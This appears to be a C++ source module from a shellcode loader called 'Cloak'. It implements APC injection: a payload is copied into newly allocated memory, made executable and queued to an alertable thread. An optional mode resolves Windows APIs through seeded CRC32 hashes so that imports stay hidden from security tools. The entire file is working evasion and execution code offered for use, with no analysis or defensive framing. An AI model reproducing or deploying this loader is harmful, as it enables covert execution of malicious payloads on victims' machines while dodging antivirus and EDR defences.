#include "Cloak.hpp"

#ifdef APC_INJECT

#ifdef HASH_API

constexpr int RandomCompileTimeSeed(void)
{
	return '0' * -23784 +
		__TIME__[7] * 345 +
		__TIME__[6] * 12 +
		__TIME__[4] * 2345123 +
		__TIME__[3] * 623 +
		__TIME__[1] * 95897 +
		__TIME__[0] * 2;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % RAND;

constexpr DWORD HashStringCrc32(const char* String) {
	UINT32      uMask	= 0x00;
    UINT32      uHash	= g_KEY;
	INT         i		= 0x00;

	while ( String[i] != 0 ) {
		uHash = uHash ^ ( UINT32 ) String[i];

		for ( int ii = 0; ii < 8; ii++ ) {
			uMask = -1 * ( uHash & 1 );
			uHash = ( uHash >> 1 ) ^ ( 0xEDB88320 & uMask );
		}

		i++;
	}

	return ~uHash;
}

#define RTIME_HASHA( API ) HashStringCrc32( ( const char* ) API )
#define CTIME_HASHA( API ) constexpr auto API##_CRC32A = HashStringCrc32( ( const char* ) #API );

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
	PBYTE pBase = ( PBYTE ) hModule;

	PIMAGE_DOS_HEADER   pImgDosHeader  = ( PIMAGE_DOS_HEADER ) pBase;
	if ( pImgDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        return NULL;
    }

	PIMAGE_NT_HEADERS   pImgNtHeaders  = ( PIMAGE_NT_HEADERS ) ( pBase + pImgDosHeader->e_lfanew );
	if ( pImgNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
		return NULL;
    }

	IMAGE_OPTIONAL_HEADER		ImgOptionalHeader		= pImgNtHeaders->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY		pImgExportDirectory     = ( PIMAGE_EXPORT_DIRECTORY ) ( pBase + ImgOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
	PDWORD						pdwFunctionNameArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfNames );
	PDWORD						pdwFunctionAddressArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfFunctions );
	PWORD						pwFunctionOrdinalArray	= ( PWORD ) ( pBase + pImgExportDirectory->AddressOfNameOrdinals );

	for ( DWORD i = 0; i < pImgExportDirectory->NumberOfFunctions; i++ ) {
		CHAR*	pFunctionName		= ( CHAR* ) ( pBase + pdwFunctionNameArray[i] );
		PVOID	pFunctionAddr   	= ( PVOID ) ( pBase + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]] );

		if ( dwApiNameHash == RTIME_HASHA( pFunctionName ) ) { 
			return ( FARPROC ) pFunctionAddr;
		}
	}

	return NULL;
}

// ---

typedef HANDLE ( WINAPI * fnCreateEventA ) (
    LPSECURITY_ATTRIBUTES lpEventAttributes,
    BOOL                  bManualReset,
    BOOL                  bInitialState,
    LPCSTR                lpName
);

typedef DWORD ( WINAPI * fnWaitForSingleObjectEx ) (
    HANDLE  hHandle,
    DWORD   dwMilliseconds,
    BOOL    bAlterable
);

typedef BOOL ( WINAPI * fnCloseHandle ) (
    HANDLE  hObject
);

typedef HANDLE ( WINAPI * fnCreateThread ) (
    LPSECURITY_ATTRIBUTES   lpThreadAttribute,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);

typedef LPVOID ( WINAPI * fnVirtualAlloc ) (
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flAllocationType,
    DWORD   flProtect
);

typedef BOOL ( WINAPI * fnVirtualProtect ) (
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flNewProtect,
    PDWORD  lpflOldProtect
);

typedef DWORD ( WINAPI * fnQueueUserAPC ) (
    PAPCFUNC    pfnAPC,
    HANDLE      hThread,
    ULONG_PTR   dwData
);

typedef DWORD ( WINAPI * fnWaitForSingleObject ) (
    HANDLE  hHandle,
    DWORD   dwMilliseconds
);

CTIME_HASHA(CreateEventA)
CTIME_HASHA(WaitForSingleObjectEx)
CTIME_HASHA(CloseHandle)
CTIME_HASHA(CreateThread)
CTIME_HASHA(VirtualAlloc)
CTIME_HASHA(VirtualProtect)
CTIME_HASHA(QueueUserAPC)
CTIME_HASHA(WaitForSingleObject)

// ---

VOID WaitForSingleObjectExAlertable() {
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return;
    }

    fnCreateEventA pCreateEventA = ( fnCreateEventA ) GetProcAddressH( hKernel32, CreateEventA_CRC32A );
    if ( pCreateEventA == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateEventA\n" );
        #endif // !DEBUG
        
        return;
    }

    fnWaitForSingleObjectEx pWaitForSingleObjectEx = ( fnWaitForSingleObjectEx ) GetProcAddressH( hKernel32, WaitForSingleObjectEx_CRC32A );
    if ( pWaitForSingleObjectEx == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pWaitForSingleObjectEx\n" );
        #endif // !DEBUG
        
        return;
    }

    fnCloseHandle pCloseHandle = ( fnCloseHandle ) GetProcAddressH( hKernel32, CloseHandle_CRC32A );
    if ( pCloseHandle == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pCloseHandle\n" );
        #endif // !DEBUG
        
        return;
    }

    
    //---
    
    HANDLE hEvent = pCreateEventA( NULL, NULL, NULL, NULL );
    if ( hEvent ) {
        pWaitForSingleObjectEx( hEvent, INFINITE, TRUE );
        pCloseHandle( hEvent );
    }
}

BOOL ApcInjection( IN PBYTE pbPayload[], IN SIZE_T sPayloadSize ) {
    
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return;
    }

    fnCreateThread pCreateThread = ( fnCreateThread ) GetProcAddressH( hKernel32, CreateThread_CRC32A );
    if ( pCreateThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnQueueUserAPC pQueueUserAPC = ( fnQueueUserAPC ) GetProcAddressH( hKernel32, QueueUserAPC_CRC32A );
    if ( pQueueUserAPC == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pQueueUserAPC\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
    if ( pWaitForSingleObject == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for WaitForSingleObject\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    // ---

    HANDLE  hThread         = NULL;
    PVOID   pPayloadAddress = NULL;
    DWORD   dwOldProtect    = NULL;

    hThread = pCreateThread(NULL, NULL, ( LPTHREAD_START_ROUTINE ) &WaitForSingleObjectExAlertable, NULL, NULL, NULL);
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = pVirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) ;
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    if ( ! pQueueUserAPC( ( PAPCFUNC ) pPayloadAddress, hThread, NULL ) ) {
        #ifdef DEBUG
        printf( "[-] QueueUserAPC Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pWaitForSingleObject(hThread, WAIT_TIME);

    return TRUE;
}

#else

VOID WaitForSingleObjectExAlertable() {
    HANDLE hEvent = CreateEvent( NULL, NULL, NULL, NULL );
    if ( hEvent ) {
        WaitForSingleObjectEx( hEvent, INFINITE, TRUE );
        CloseHandle( hEvent );
    }
}

BOOL ApcInjection( IN PBYTE pbPayload[], IN SIZE_T sPayloadSize ) {
    HANDLE  hThread         = NULL;
    PVOID   pPayloadAddress = NULL;
    DWORD   dwOldProtect    = NULL;

    hThread = CreateThread(NULL, NULL, ( LPTHREAD_START_ROUTINE ) &WaitForSingleObjectExAlertable, NULL, NULL, NULL);
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) ;
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    if ( ! QueueUserAPC( ( PAPCFUNC ) pPayloadAddress, hThread, NULL ) ) {
        #ifdef DEBUG
        printf( "[-] QueueUserAPC Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    WaitForSingleObject(hThread, WAIT_TIME);

    return TRUE;
}

#endif // !HASH_API

#endif // !APC